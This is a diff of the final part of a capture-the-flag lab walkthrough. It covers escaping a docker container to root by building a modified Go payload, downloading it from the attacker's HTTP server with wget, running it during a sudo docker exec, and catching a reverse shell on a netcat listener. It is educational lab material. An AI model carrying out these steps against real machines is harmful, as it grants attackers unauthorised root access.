@@ -54,9 +54,3 @@ We clone the repository, and modify the main.go file. We will modify the payload
 
 After this is done, we save the file and build our main by issuing the command go build main.go
 This should result in producing a compiled file called just main. Start a mini http server on port 1010 so we are able to upload the main to the target machine as this will be the payload that will be executed to get us to root. We go back to the target machine and issue our sudo command to get into the docker container: sudo /usr/bin/docker exec -it webapp-dev01 bash. Now that we are in the docker container, running as sudo, we open a second instance of noah’s ssh shell and start a netcat listener on port 1337 on our local machine. On the docker instance, we cd into /tmp and then issue a wget http://10.10.16.160:1010/main to download the main we just built with go. Once it is downloaded, we issue the chmod +x ./main command in order to add executable permissions to it. Before we run it, make sure to have the same sudo /usr/bin/docker exec -it webapp-dev01 bash ready in the second terminal, as you’ll have to be quick. Run the ./main in the first docker instance and while it is initializing, issue the command in the second ssh shell and you should hey the response: no help topic for ‘/bin/sh’ if you see this, you’re on the right track and once the command finishes compiling, it should start a shell to root account in the netcat session that is listening on port 1337 should connect via the payload and grant us root permissions. Now we can cd into /root and retrieve our root flag! Good job on finishing this lab!
-
-
-
-
-**-------------------------------------------------------------------------------------------------------------------------------**
-
